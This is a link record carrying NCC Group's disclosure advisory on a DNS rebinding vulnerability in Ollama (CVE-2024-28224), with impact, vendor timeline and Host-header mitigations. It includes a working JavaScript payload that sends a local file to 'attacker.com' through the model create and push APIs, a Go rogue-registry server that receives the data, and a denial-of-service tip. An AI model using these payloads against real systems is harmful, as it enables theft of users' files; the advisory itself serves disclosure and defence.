{"aid": "40024940", "title": "Ollama DNS Rebinding Vulnerability (CVE-2024-28224)", "url": "https://research.nccgroup.com/2024/04/08/technical-advisory-ollama-dns-rebinding-attack-cve-2024-28224/", "domain": "nccgroup.com", "votes": 5, "user": "dytir", "posted_at": "2024-04-13 18:18:02", "comments": 0, "source_title": "Technical Advisory \u2013 Ollama DNS Rebinding Attack (CVE-2024-28224)", "source_text": "Technical Advisory \u2013 Ollama DNS Rebinding Attack (CVE-2024-28224) | NCC Group Research Blog | Making the world safer and more secure\n\nBack\n\nG\u00e9rald Doussot\n\nResearch\n\nTechnical advisories\n\nVulnerability\n\nApril 8, 2024\n\n7 mins read\n\n# Technical Advisory \u2013 Ollama DNS Rebinding Attack (CVE-2024-28224)\n\n    \n    \n    Vendor: Ollama Vendor URL: https://ollama.com/ Versions affected: Versions prior to v0.1.29 Systems Affected: All Ollama supported platforms Author: G\u00e9rald Doussot Advisory URL / CVE Identifier: CVE-2024-28224 Risk: High, Data Exfiltration\n\n## Summary:\n\nOllama is an open-source system for running and managing large language models\n(LLMs).\n\nNCC Group identified a DNS rebinding vulnerability in Ollama that permits\nattackers to access its API without authorization, and perform various\nmalicious activities, such as exfiltrating sensitive file data from vulnerable\nsystems.\n\nOllama fixed this issue in release v0.1.29. Ollama users should update to this\nversion, or later.\n\n## Impact:\n\nThe Ollama DNS rebinding vulnerability grants attackers full access to the\nOllama API remotely, even if the vulnerable system is not configured to expose\nits API publicly. Access to the API permits attackers to exfiltrate file data\npresent on the system running Ollama. Attackers can perform other unauthorized\nactivities such as chatting with LLM models, deleting these models, and to\ncause a denial-of-service attack via resource exhaustion. DNS rebinding can\nhappen in as little as 3 seconds once connected to a malicious web server.\n\n## Details:\n\nOllama is vulnerable to DNS rebinding attacks, which can be used to bypass the\nbrowser same-origin policy (SOP). Attackers can interact with the Ollama\nservice, and invoke its API on a user desktop machine, or server.\n\nAttackers must direct Ollama users running Ollama on their computers to\nconnect to a malicious web server, via a regular, or headless web browser (for\ninstance, in the context of a server-side web scraping application). The\nmalicious web server performs the DNS rebinding attack to force the web\nbrowsers to interact with the vulnerable Ollama instance, and API, on the\nattackers\u2019 behalf.\n\nThe Ollama API permits to manage and run local models. Several of its APIs\nhave access to the file system and can pull/retrieve data from/to remote\nrepositories. Once the DNS rebinding attack has been successful, attackers can\nsequence these APIs to read arbitrary file data accessible by the process\nunder which Ollama runs, and exfiltrate this data to attacker-controlled\nsystems.\n\nNCC Group successfully implemented a proof-of-concept data exfiltration attack\nusing the following steps:\n\nDeploy NCC Group\u2019s Singularity of Origin DNS rebinding application, which\nincludes the components to configure a \u201cmalicious host\u201d, and to perform DNS\nrebinding attacks.\n\nSingularity requires the development of attack payloads to exploit specific\napplications such as Ollama, once DNS rebinding has been achieved. A proof-of-\nconcept payload, written in JavaScript is provided below. Variable\nEXFILTRATION_URL, must be configured to point to an attacker-owned domain,\nsuch as attacker.com, to send the exfiltrated data, from the vulnerable host.\n\n    \n    \n    /** This is a sample payload to exfiltrate files from hosts running Ollama **/\n    \n    const OllamaLLama2ExfilData = () => {\n    \n    // Invoked after DNS rebinding has been performed function attack(headers, cookie, body) { if (headers !== null) { console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`); }; if (cookie !== null) { console.log(`Origin: ${window.location} headers: ${cookie}`); }; if (body !== null) { console.log(`Origin: ${window.location} body:\\n${body}`); };\n    \n    let EXFILTRATION_URL = \"http://attacker.com/myrepo/mymaliciousmodel\"; sooFetch('/api/create', { method: 'POST', mode: \"no-cors\", headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' }, body: `{ \"name\": \"${EXFILTRATION_URL}\", \"modelfile\": \"FROM llama2\\\\nSYSTEM You are a malicious model file\\\\nADAPTER /tmp/test.txt\"}` }).then(responseOKOrFail(\"Could not invoke /api/create\")) .then(function (d) { //data console.log(d) return sooFetch('/api/push', { method: 'POST', mode: \"no-cors\", headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' }, body: `{ \"name\": \"${EXFILTRATION_URL}\", \"insecure\": true}` }); }).then(responseOKOrFail(\"Could not invoke /api/push\")) .then(function (d) { //data console.log(d); }); }\n    \n    // Invoked to determine whether the rebinded service // is the one targeted by this payload. Must return true or false. async function isService(headers, cookie, body) { if (body.includes(\"Ollama is running\") === true) { return true; } else { return false; } }\n    \n    return { attack, isService } }\n    \n    // Registry value and manager-config.json value must match Registry[\"Ollama Llama2 Exfiltrate Data\"] = OllamaLLama2ExfilData();\n\nAt a high-level, the payload invokes two Ollama APIs to exfiltrate data, as\nexplained below.\n\n### Invoke the \u201cCreate a Model\u201d API\n\nThe body of the request contains the following data:\n\n    \n    \n    `{ \"name\": \"${EXFILTRATION_URL}\", \"modelfile\": \"FROM llama2\\\\nSYSTEM You are a malicious model file\\\\nADAPTER /tmp/test.txt\"}`\n\nThis request triggers the creation of a model in Ollama. Of note, the model is\nconfigured to load data from a file via the ADAPTER instruction, in parameter\nmodelfile. This is the file we are going to exfiltrate, and in our example, an\nexisting text file accessible via pathname /tmp/test.txt on the host running\nOllama.\n\n(As a side note the FROM instruction also supports filepath values, but was\nfound to be unsuitable to exfiltrate data, as the FROM file content is\nvalidated by Ollama. This is not the case for the ADAPTER parameter. Note\nfurther that one can cause a denial-of-service attack via the FROM\ninstruction, when specifying values such as /dev/random, remotely via DNS\nrebinding.)\n\nThe model name typically consists of a repository, and model name in the form\nrepository/modelname. We found that we can specify a URL instead e.g.\nhttp://attacker.com/myrepo/mymaliciousmodel. This feature is seemingly present\nto permit sharing user developed models to other registries than the default\nhttps://registry.ollama.ai/ registry. Specifying \u201cattacker.com\u201d allows\nattackers to exfiltrate data to another (attacker-controlled) registry.\n\nUpon completion of the call to the \u201cCreate a Model\u201d API request, Ollama will\nhave gathered a number of artifacts composing the newly created user model,\nincluding Large Language Model data, license data, etc., and our file to\nexfiltrate, all of them addressable by their SHA256 contents.\n\n### Invoke the \u201cPush a Model\" API\n\nThe body of the request contains the following data:\n\n    \n    \n    `{ \"name\": \"${EXFILTRATION_URL}\", \"insecure\": true}`\n\nThe name parameter remains the same as before. The insecure parameter is set\nto true to avoid having to configure an exfiltration host that is secured\nusing TLS. This request will upload all artifacts of the created model,\nincluding model data, and the file to exfiltrate to the attacker host.\n\n### Exfiltration to Rogue LLM Registry\n\nOllama uses a different API to communicate with the registry (and in our case,\nthe data exfiltration host). We wrote a proof-of-concept web server in the Go\nlanguage, that implements enough of the registry API to receive the\nexfiltrated data and dump it in the terminal. It also lies to the Ollama\nclient process in order to save bandwidth, and make the attack more efficient,\nby stating that it already has the LLM data (several GBs), based on known\nhashes of their contents.\n\n    \n    \n    package main import ( \"fmt\" \"io\" \"log\" \"net/http\" \"net/http/httputil\" \"strings\" ) func main() { http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { reqDump, _ := httputil.DumpRequest(r, true) reqDumps := string(reqDump) fmt.Printf(\"REQUEST:\\n%s\", reqDumps) host := r.Host switch r.Method { case \"HEAD\": if strings.Contains(reqDumps, \"c70fa74a8e81c3bd041cc2c30152fe6e251fdc915a3792147147a5c06bc4b309\") || strings.Contains(reqDumps, \"8934d96d3f08982e95922b2b7a2c626a1fe873d7c3b06e8e56d7bc0a1fef9246\") { w.WriteHeader(http.StatusOK) return } w.WriteHeader(http.StatusNotFound) return case \"POST\", \"PATCH\": w.Header().Set(\"Docker-Upload-Location\", fmt.Sprintf(\"http://%s/v2/repo/mod/blobs/uploads/whatever\", host)) w.Header().Set(\"Location\", fmt.Sprintf(\"http://%s/v2/repo/mod/blobs/uploads/whatever\", host)) w.WriteHeader(http.StatusAccepted) default: } b, err := io.ReadAll(r.Body) if err != nil { panic(err) } fmt.Printf(\"Data: %s\", b) }) log.Fatal(http.ListenAndServe(\":80\", nil)) }\n\n## Recommendation:\n\nUsers should update to at least version v0.1.29 of Ollama, which fixed the DNS\nrebinding vulnerability.\n\nFor reference, NCC Group provided the following recommendations to Ollama to\naddress the DNS rebinding vulnerability:\n\nUse TLS on all services including localhost, if possible.\n\nFor services listening on any network interface, authentication should be\nrequired to prevent unauthorized access.\n\nDNS rebinding attacks can also be prevented by validating the Host HTTP header\non the server-side to only allow a set of authorized values. For services\nlistening on the loopback interface, this set of whitelisted host values\nshould only contain localhost, and all reserved numeric addresses for the\nloopback interface, including 127.0.0.1.\n\nFor instance, let's say that a service is listening on address 127.0.0.1, TCP\nport 3000. Then, the service should check that all HTTP request Host header\nvalues strictly contain 127.0.0.1:3000 and/or localhost:3000. If the host\nheader contains anything else, then the request should be denied.\n\nDepending on the application deployment model, you may have to whitelist other\nor additional addresses such as 127.0.0.2, another reserved numeric address\nfor the loopback interface.\n\nFiltering DNS responses containing private, link-local or loopback addresses,\nboth for IPv4 and IPv6, should not be relied upon as a primary defense\nmechanism against DNS rebinding attacks.\n\n## Vendor Communication:\n\n  * 2024-03-08 - NCC Group emailed Ollama asking for security contact address.\n  * 2024-03-08 - Ollama confirmed security contact address.\n  * 2024-03-08 - NCC Group disclosed the issue to Ollama.\n  * 2024-03-08 - Ollama indicated they are working on a fix.\n  * 2024-03-08 - Ollama released a fix in Ollama GitHub repository main branch.\n  * 2024-03-09 - NCC Group tested the fix, and informed Ollama that the fix successfully addressed the issue.\n  * 2024-03-09 - Ollama informed NCC Group that they are working on a new release incorporating the fix.\n  * 2024-03-11 - NCC Group emailed Ollama asking whether an 2024-04-08 advisory release date is suitable.\n  * 2024-03-14 - Ollama released Ollama version v0.1.29, which includes the fix.\n  * 2024-03-18 - NCC Group emailed Ollama asking to confirm whether an 2024-04-08 advisory release date is suitable.\n  * 2024-03-23 - Ollama stated that the 2024-04-08 advisory release date tentatively worked. Ollama asked if later date suited, as they wanted to continue monitoring the rollout of the latest version of Ollama, to make sure enough users have updated ahead of the disclosure.\n  * 2024-03-25 - NCC Group reiterated preference for 2024-04-08 advisory release date, noting that the code fix is visible to the public in the Ollama repository main branch since 2024-03-08.\n  * 2024-04-04 - NCC Group sent an email indicating that the advisory will be published on 2024-04-08.\n  * 2024-04-08 - NCC Group released security advisory.\n\n## Acknowledgements:\n\nThanks to the Ollama team, and Kevin Henry, Roger Meyer, Javed Samuel, and\nRistin Rivera from NCC Group for their support during the disclosure process.\n\n## About NCC Group:\n\nNCC Group is a global expert in cybersecurity and risk mitigation, working\nwith businesses to protect their brand, value and reputation against the ever-\nevolving threat landscape. With our knowledge, experience and global\nfootprint, we are best placed to help businesses identify, assess, mitigate &\nrespond to the risks they face. We are passionate about making the Internet\nsafer and revolutionizing the way in which organizations think about\ncybersecurity.\n\n2024-04-08: Release date of advisory\n\nWritten by: G\u00e9rald Doussot\n\nPublished by G\u00e9rald Doussot\n\nPublished by G\u00e9rald Doussot\n\nView all posts by G\u00e9rald Doussot ->\n\n### Here are some related articles you may find interesting\n\n#### Public Report \u2013 Confidential Mode for Hyperdisk \u2013 DEK Protection Analysis\n\nDuring the spring of 2024, Google engaged NCC Group to conduct a design review\nof Confidential Mode for Hyperdisk (CHD) architecture in order to analyze how\nthe Data Encryption Key (DEK) that encrypts data-at-rest is protected. The\nproject was 10 person days and the goal is to validate that the...\n\nPublic Reports\n\nApril 12, 2024\n\n1 min read\n\n#### Non-Deterministic Nature of Prompt Injection\n\nAs we explained in a previous blogpost, exploiting a prompt injection attack\nis conceptually easy to understand: There are previous instructions in the\nprompt, and we include additional instructions within the user input, which is\nmerged together with the legitimate instructions in a way that the underlying\nmodel cannot distinguish...\n\nMachine Learning\n\nOffensive Security & Artificial Intelligence\n\nApril 12, 2024\n\n3 mins read\n\n#### Public Report \u2013 Google Privacy Sandbox Aggregation Service and\nCoordinator\n\nDuring the winter of 2022, Google engaged NCC Group to conduct an in-depth\nsecurity review of the Aggregation Service, part of Google\u2019s Privacy Sandbox\ninitiative. Google describes the Aggregation Service as follows: The Privacy\nSandbox initiative aims to create technologies that both protect people\u2019s\nprivacy online and give companies and...\n\nPublic Reports\n\nMarch 28, 2024\n\n2 mins read\n\nPrevious post Next post\n\n### View articles by category\n\n  * 5G Security & Smart Environments (10)\n\n  * Academic Partnership (3)\n\n  * Annual Research Report (3)\n\n  * Asia Pacific Research (1)\n\n  * Awards & Recognition (4)\n\n  * Blockchain (5)\n\n  * Books (17)\n\n  * Business Insights (6)\n\n  * Cloud & Containerization (34)\n\n  * Cloud Security (18)\n\n  * Conferences (37)\n\n  * Corporate (7)\n\n  * Cryptography (115)\n\n  * CTFs/Microcorruption (1)\n\n  * Current events (1)\n\n  * Cyber as a Science (6)\n\n  * Cyber Security (403)\n\n  * Detection and Threat Hunting (16)\n\n  * Digital Forensics and Incident Response (DFIR) (22)\n\n  * Disclosure Policy (1)\n\n  * Emerging Technologies (12)\n\n  * Engineering (5)\n\n  * Fox-IT (18)\n\n  * Fox-IT and European Research (7)\n\n  * Gaming & Media (9)\n\n  * Hardware & Embedded Systems (106)\n\n  * Intern Projects (2)\n\n  * iSec Partners (52)\n\n  * Machine Learning (29)\n\n  * Managed Detection & Response (22)\n\n  * Misinformation, Deepfakes, & Synthetic Media (2)\n\n  * North American Research (28)\n\n  * Offensive Security & Artificial Intelligence (14)\n\n  * Patch notifications (35)\n\n  * Presentations (55)\n\n  * protocol_name (1)\n\n  * Public interest technology (1)\n\n  * Public interest technology (10)\n\n  * Public Reports (52)\n\n  * Public tools (105)\n\n  * Reducing Vulnerabilities at Scale (22)\n\n  * Research (366)\n\n  * Research Paper (20)\n\n  * Resources (1)\n\n  * Reverse Engineering (48)\n\n  * Risk Management & Governance (6)\n\n  * Standards (13)\n\n  * Technical advisories (219)\n\n  * Technology Policy (1)\n\n  * Threat briefs (3)\n\n  * Threat Intelligence (69)\n\n  * Tool Release (107)\n\n  * Transport (16)\n\n  * Tutorial/Study Guide (47)\n\n  * UK Research (10)\n\n  * Uncategorized (29)\n\n  * Virtualization, Emulation, & Containerization (10)\n\n  * VSR (32)\n\n  * Vulnerability (168)\n\n  * Vulnerability Research (7)\n\n  * Whitepapers (239)\n\n### Most popular posts\n\n### Most recent posts\n\n  * Public Report \u2013 Confidential Mode for Hyperdisk \u2013 DEK Protection Analysis\n  * Non-Deterministic Nature of Prompt Injection\n  * Technical Advisory \u2013 Ollama DNS Rebinding Attack (CVE-2024-28224)\n  * Public Report \u2013 Google Privacy Sandbox Aggregation Service and Coordinator\n  * Android Malware Vultur Expands Its Wingspan\n\n## Call us before you need us.\n\nOur experts will help you.\n\nGet in touch\n\nCall us on:\n\nGeneral Number:\n\n441612095200\n\n24/7 Emergency Incident Response:\n\n443316300690\n\nTerms and Conditions Privacy Policy Contact Us Accessibility Disclosure Policy\n\nAssessment & Advisory Detection and Response Compliance Remediation Training\nSoftware Resilience\n\n\u00a9 NCC Group 2024. All rights reserved.\n\n", "frontpage": false}
